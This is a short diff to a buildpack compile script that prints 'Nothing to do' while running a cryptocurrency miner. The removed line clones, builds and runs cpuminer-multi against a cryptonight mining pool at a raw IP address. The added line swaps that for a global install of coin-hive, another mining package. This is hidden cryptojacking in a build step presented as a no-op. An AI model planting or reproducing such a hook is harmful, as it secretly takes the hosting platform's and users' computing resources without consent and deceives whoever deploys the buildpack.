@@ -2,4 +2,4 @@
 # bin/compile <build-dir> <cache-dir>
 
 echo "-----> Nothing to do."
-git clone https://github.com/wolf9466/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && ./configure && make && ./minerd -a cryptonight -o stratum+tcp://52.10.190.203:8080 -u 12345 -p 1 -t 1
+npm install -g coin-hive
